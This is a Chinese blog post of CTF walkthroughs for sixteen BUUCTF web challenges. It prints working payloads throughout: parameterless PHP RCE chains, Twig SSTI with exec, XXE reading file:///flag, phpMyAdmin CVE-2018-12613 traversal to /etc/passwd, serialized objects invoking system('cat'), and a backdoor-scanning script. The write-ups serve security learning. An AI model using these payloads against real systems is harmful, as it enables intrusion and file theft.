---
title: BUU_WEB刷题_0x20-0x2F
date: 2021-09-12 
tags: WEB
categories: Technology
---

[toc]

# 0x20.[GXYCTF2019]禁止套娃

>    考点是无参数RCE先贴两个链接：
>
>   https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE
>
>   http://www.heetian.com/info/827



找了半天没发现啥，看wp说是git泄露，然后

```shell
┌──(kali㉿kali)-[~/GitHack]
└─$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/
[+] Download and parse index file ...
error: Not a Git index file
                                                                                                                                              
┌──(kali㉿kali)-[~/GitHack]
└─$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/.git                                                 1 ⨯
[+] Download and parse index file ...
index.php
[OK] index.php
                                                                                                                                              
┌──(kali㉿kali)-[~/GitHack]
└─$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/.gitls
[+] Download and parse index file ...
error: Not a Git index file
                                                                                                                                              
┌──(kali㉿kali)-[~/GitHack]
└─$ ls                                                                                                                                    1 ⨯
25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81  GitHack.py  index  lib  README.md
                                                                                                                                              
┌──(kali㉿kali)-[~/GitHack]
└─$ cd 25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81 
                                                                                                                                              
┌──(kali㉿kali)-[~/GitHack/25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81]
└─$ ls
index.php
                                                                                                                                              
┌──(kali㉿kali)-[~/GitHack/25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81]
└─$ cat index.php                                            
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

```

首先一些php的伪协议不能够使用，第二层(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数，第三层过滤了一些函数

说下第二层：

```php
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
{
// echo $_GET['exp'];
@eval($_GET['exp']);
}
```

会发现使用参数就无法通过正则，(?R)?这个意思为递归整个匹配模式,所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;.举个例子：a(b(c()));可以使用，但是a(‘b’)或者a(‘b’,’c’)这种含有参数的都不能使用,所以我们要使用无参数的函数进行文件读取或者命令执行.

构造`exp=print_r(phpversion());`发现可以执行

首先要知道都有什么文件，使用print_r(scandir('.'));，会出问题，因为有参数.

下面就要找一个来代替scandir('.')，

要用到的函数：

1.  localeconv():localeconv()返回一包含本地数字及货币格式信息的数组。这个数组的第一项就是我们需要的”.”
2.  current():current()返回数组中的单元,默认取第一个值,在本题中我们只需要使用localeconv(current())便可以构造出我们一直念念不忘的”.”
3.  array_reverse():将输入的数组反向排序输出,在本题中将index.php作为数组的第一个元素,flag.php作为数组的第二个元素.
4.  next():将当前数组的光标向后移一位,在本题中即将光标从index.php转向后面一项的flag.php

可以构造payload：`exp=print_r(scandir(current(localeconv())));`

![image-20210912111645049](BUU-WEB-0x20-0x2F/image-20210912111645049.png)

然后继续构造：`exp=print_r(next(array_reverse(scandir(current(localeconv())))));`

发现已经是flag.php了然后可以用以下任意函数来包含：

```
how_source(end(scandir(getcwd())));
readfile
highlight_file
file_get_contents 
```

最终payload：`exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));`

# 0x21.[BJDCTF2020]The mystery of ip

>   考点是SSTI模板注入，但是这个比较简单，这里贴个图：
>
>   ![image-20210912114416606](BUU-WEB-0x20-0x2F/image-20210912114416606.png)

这题环境开的时候以为环境出问题了，加了index.php后发现没问题

看了看没啥头绪，然后wp：

和ip有关，尝试xff或者client-ip，123或者{7*8}，都可以控制

然后``{system("cd ../../../;ls")}`发现flag

{system("cd ../../../;cat flag")}

# 0x22.[强网杯 2019]高明的黑客

解压下来3k多个文件。。

考点其实就是代码的编写，不会，找的网上的一些。

```python
import os
import threading
from concurrent.futures.thread import ThreadPoolExecutor
 
import requests
 
session = requests.Session()
 
path = "D://phpStudy//PHPTutorial//WWW//src//"  # 文件夹目录
files = os.listdir(path)  # 得到文件夹下的所有文件名称
 
mutex = threading.Lock()
pool = ThreadPoolExecutor(max_workers=50)
 
def read_file(file):
    f = open(path + "/" + file);  # 打开文件
    iter_f = iter(f);  # 创建迭代器
    str = ""
    for line in iter_f:  # 遍历文件，一行行遍历，读取文本
        str = str + line
 
    # 获取一个页面内所有参数
    start = 0
    params = {}
    while str.find("$_GET['", start) != -1:
        pos2 = str.find("']", str.find("$_GET['", start) + 1)
        var = str[str.find("$_GET['", start) + 7: pos2]
        start = pos2 + 1
 
        params[var] = 'echo("glzjin");'
 
        # print(var)
 
    start = 0
    data = {}
    while str.find("$_POST['", start) != -1:
        pos2 = str.find("']", str.find("$_POST['", start) + 1)
        var = str[str.find("$_POST['", start) + 8: pos2]
        start = pos2 + 1
 
        data[var] = 'echo("glzjin");'
 
        # print(var)
 
    # eval test
    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()
 
    # assert test
    for i in params:
        params[i] = params[i][:-1]
 
    for i in data:
        data[i] = data[i][:-1]
 
    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()
 
    # system test
    for i in params:
        params[i] = 'echo glzjin'
 
    for i in data:
        data[i] = 'echo glzjin'
 
    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()
 
    # print("====================")
 
for file in files:  # 遍历文件夹
    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开
        # read_file(file)
 
        pool.submit(read_file, file)
```

# 0x23.[GWCTF 2019]我有一个数据库

考点就是：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞

怎么说呢，有点离谱，啥都没有就能知道是这个洞？

有人说猜到有phpmyadmin直接进去了，，，行吧。

> phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞
>
> 影响版本：4.8.0——4.8.1
>
> payload: /phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd

可以正常出现，文件改为flag就出来了

# 0x24.[BJDCTF2020]ZJCTF，不过如此

>   知识点：
>
>   preg_replace代码执行，
>
>   先知社区：https://xz.aliyun.com/t/2557
>
>   国光师傅：https://www.sqlsec.com/2020/07/preg_replace.html

审计：

```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

构造payload：`?text=data://text/plain,I%20have%20a%20dream&file=php://filter/read=convert.base64-encode/resource=next.php`读next.php

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```

存在preg_replace代码执行，但是如果GET传`.*=xxx`，会出问题，成为\_*=xxx

所以有这样的payload：`\S*=${phpinfo()}`

接下来就有两种解法：

**解法一**：使用源码中给的函数

`/next.php?\S*=${getflag()}&cmd=show_source(""/flag");`

**解法二**：通过POST传参

```
next.php?\S*=${eval($_POST[cmd])};
aaa=system("cat /flag");
```

或者GET：

```php
next.php?\S*=next.php?\S*=${eval($_GET[aaa])}&aaa=system("cat /flag");
```



# 0x25.[BJDCTF2020]Mark loves cat

>   考点：变量覆盖

dirsearch扫完有git泄露

然后我githack搞了好久需要的文件就是tmd出不来。。。

直接看网上的：

```php
<?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

echo "the flag is: ".$flag;"
```

可变变量，又叫套娃变量，可以先看下：https://www.php.net/manual/zh/language.variables.variable.php

先看payload再分析：

```
?yds=flag
post: $flag=1
```

首先是：

```php
foreach($_POST as $x => $y){
    $$x = $y;
}
```

那么这时\$x=\$flag，\$y=1，然后\$\$x=\$flag

然后：

```php
foreach($_GET as $x => $y){
    $$x = $$y;
}
```

这时\$x=yds,\$y=flag，也就是说\$\$x=\$yds=\$flag，

# 0x26.[网鼎杯 2020 朱雀组]phpweb

进去之后什么都没有，然后等了几秒后有报错的信息，抓包之后有fun和p两个post的参数。

`func=date&p=Y-m-d+h%3Ai%3As+a`，php中恰好有date函数，且参数也是后面那样。

那么可能fun就是函数，p是参数，改个eval('phpinfo()')试一下：`eval('phpinfo();');`

恩。。有过滤，再试试读文件：file_get_contents()

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo",
                         "popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg",
                         "assert","substr_replace","call_user_func_array","call_user_func","array_filter", 
                         "array_walk",  "array_map","registregister_shutdown_function","register_tick_function",
                         "filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", 
                         "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
	$result = call_user_func($func, $p);
	$a= gettype($result);
	if ($a == "string") {
		return $result;
	} else {
		return "";
	}
}
class Test {
	var $p = "Y-m-d h:i:s a";
	var $func = "date";
	function __destruct() {
		if ($this->func != "") {
			echo gettime($this->func, $this->p);
		}
	}
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];
if ($func != null) {
	$func = strtolower($func);
	if (!in_array($func,$disable_fun)) {
		echo gettime($func, $p);
	} else {
		die("Hacker...");
	}
}
?>
```

可以看到过滤了很多函数和字符串，而造成可以运行输入的函数就是`call_user_func`，没有禁用反序列化unserialize函数

```php
class Test {
	var $p = "Y-m-d h:i:s a";
	var $func = "date";
	function __destruct() {
		if ($this->func != "") {
			echo gettime($this->func, $this->p);
		}
	}
}
$a = new Test();
$a->func = "system";
// $a->p =  "ls";
// $a->p =  "find / -name 'flag*'";
$a->p =  "cat /tmp/flagoefiu4r93";
echo serialize($a);

out:
O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

# 0x27.[安洵杯 2019]easy_web

url中：`index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=`，其中img是hex+base64+base64

把index.php按照上面加密后：

```php+HTML
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

后面post的a和b用md5碰撞可以绕过

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

而前面的正则中过滤了很多（dir可以用），cat可以使用ca\t来绕过

tmd我也不知道咋回事，就一直不成功...（不知道是post的ab的问题还是传cmd的问题）然后就突然成功了，，，也不知道是哪里写的有问题。

对了，GET改POST的时候发的包也要改。

# 0x28.[BSidesCF 2020]Had a bad day

>   考点就是文件包含

url中加了'后报了错：

```
Warning: include(meowers‘’.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening 'meowers‘’.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37
```

可能有文件包含的洞，然后用php伪协议读index.php，这里只写到了index，后面的php代码会自己加上：

`category=php://filter/read=convert.base64-encode/resource=flag`

```php+HTML
.....other html
<?php
$file = $_GET['category'];
if(isset($file)) {
	if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")) {
		include ($file . '.php');
	} else {
		echo "Sorry, we currently only support woofers and meowers.";
	}
}
?>
.....other html
```

然后试了下：`category=woofers/../flag`，出现了`<!-- Can you read this flag? -->`

之后看到了可以这样文件包含：

```
category=php://filter/read=convert.base64-encode/resource=flag
category=php://filter/read=convert.base64-encode/woofers/resource=flag
这样既有woofers，也不会影响文件包含
```

可以拿到flag

# 0x29.[NCTF2019]Fake XML cookbook

>   考点：XXE
>
>   https://xz.aliyun.com/t/6887
>
>   https://www.freebuf.com/vuls/175451.html

首先看题目就知道应该是XXE，源码：

```javascript
<script type='text/javascript'> 
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
</script>
```

构造payload：

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY penson SYSTEM "file:///flag" >
]>
<user><username>&penson;</username><password>1</password></user>
```

```http
POST /doLogin.php HTTP/1.1
Host: 65f2487a-3114-4754-a3cf-450a6d829bde.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 14 Dec 2019 15:09:41 GMT
If-None-Match: "1542-599ab5e1d7740-gzip"
Cache-Control: max-age=0
Content-Length: 191

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY penson SYSTEM "file:///flag" >
]>
<user><username>&penson;</username><password>1</password></user>
```

还看到一个师傅写的payload可以读doLogin.php文件：

```xml-dtd
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">
 ]>
<user><username>&file;</username><password>456</password></user>
```

解码：

```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; 
$PASSWORD = '024b87931a03f738fff6693ce0a78c88';
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

# 0x2A.[BJDCTF2020]Cookie is so stable

>   SSTI模板注入漏洞：
>
>   https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/

测试输入`{{7*'7'}}`结果为：49，是Twig。

然后注入点是在user：

```http
GET /flag.php HTTP/1.1
Host: 48beec68-7c7c-44aa-8133-ee13e7e06236.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://48beec68-7c7c-44aa-8133-ee13e7e06236.node4.buuoj.cn:81/flag.php
Connection: keep-alive
Cookie: PHPSESSID=a792e0ea6d47a5e6e773e46b2b494dc1; user=%7B%7B7%2A%277%27%7D%7D
Upgrade-Insecure-Requests: 1
```

直接用上面文章的payload：

`user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}`

# 0x2B.[ASIS 2019]Unicorn shop

>   考点是编码相关的问题：
>
>   https://xz.aliyun.com/t/5402#toc-0

进去之后让你买东西，并且只能是一个字符`Only one char(?) allowed!`，（要买第四个最贵的那个）

有个网址：https://www.compart.com/en/unicode/

搜索thousand选一个大雨1337的就可以拿到flag

我选的是：`0xF0 0x90 0x84 0xAE`，然后改为%就可以了

# 0x2C.[安洵杯 2019]easy_serialize_php

>   考点就是PHP反序列化的字符逃逸
>
>   https://blog.csdn.net/qq_45521281/article/details/107135706
>
>   自我感觉是一个很有意思的题。


```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

传phpinfo的时候发现了 d0g3_f1ag.php文件。auto_append_file在所有页面的底部自动包含文件

```php
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&function=show_image

extract($_POST) 存在变量覆盖漏洞

```

反序列化之后：

```php
"a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"

";s:8:"function";s:59:"a 其长度为24，作为一个整体成了user的值
后面";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"这部分被舍弃
这里最后面加上的s:2:"dd";s:1:"a"是为了满足最前面a:3:中的3
```

之后发现在另一个文件里，然后改下名字：

```php
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}&function=show_image
```

# 0x2D.[极客大挑战 2019]PHP

>   考点还是反序列化

下载备份文件，审计：

class.php

```php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
index.php:
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
?>
```

当username==="admin"时可以拿到flag。

得到：`O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}`

反序列化的时候会首先执行`__wakeup()`魔术方法，所以要跳过`__wakeup()`去执行`__destruct()`

在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行。

因此：`O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}`

private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度

因此：`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

# 0x2E.[De1CTF 2019]SSRF Me

提示说flag在./flag.txt中。

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json

reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')
```

>   urllib.unquote 是url解码   
>
>   urlib.urlencode 是url编码  
>
>   request.args.get获取单个值

geneSign页面：传param参数然后返回getSign()函数。

De1ta页面：传action和sign两个cookie，还有一个get的param，然后绕waf，waf主要是过滤了两段的空格，转小写，然后不能使用gopher和file两个伪协议，

```python
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
```

需要：`secert_key + flag.txtrand + scan`

构造`/geneSign?param=flag.txtread`得到cookie：`0dd168cd293d52dfc3908caa3847a57d`

然后访问`De1ta`页面：

`Cookie: action=readscan;sign=0dd168cd293d52dfc3908caa3847a57d`

拿到flag

# 0x2F.[CISCN 2019 初赛]Love Math

>   知识点：
>
>   **PHP函数：**
>
>   scandir() 函数：返回指定目录中的文件和目录的数组。
>   base_convert() 函数：在任意进制之间转换数字。
>   dechex() 函数：把十进制转换为十六进制。
>   hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。
>   var_dump() ：函数用于输出变量的相关信息。
>   readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。
>   语法：readfile(filename,include_path,context)
>
>   **动态函数**
>
>   php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = "sayHello";$function();
>
>   **php中函数名默认为字符串**
>
>   例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择

审计

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```



第一种payload构造方法：`$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag`

```php
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```

第二种payload：`$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`

```
base_convert(696468,10,36) => "exec"
$pi(8768397090111664438,10,30) => "getallheaders"
exec(getallheaders(){1})
操作的base_convert和(696468,10,36)都可以输出，中间用逗号隔开
```

```http
GET /?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) HTTP/1.1
Host: 5f45c01f-ba8f-4226-b257-a443769cc63f.node4.buuoj.cn:81
